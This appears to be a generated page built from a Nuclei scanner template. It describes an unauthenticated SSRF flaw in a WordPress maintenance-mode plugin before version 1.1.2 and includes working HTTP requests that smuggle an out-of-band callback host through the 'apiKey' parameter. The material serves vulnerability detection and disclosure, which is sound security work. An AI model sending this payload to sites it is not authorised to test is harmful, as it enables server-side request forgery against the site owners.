# Nuclei Template: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request Forgery (SSRF)
**Template ID:** wp-under-construction-ssrf
**Vulnerability Class:** Resource Injection
**Severity:** High
**CWE:** CWE-99
**Source:** Nuclei Template (`wp-under-construction-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
```

## References
- https://wpscan.com/vulnerability/24784c84-3efd-4166-81c1-e5a266562cfc
- https://packetstormsecurity.com/files/161576/
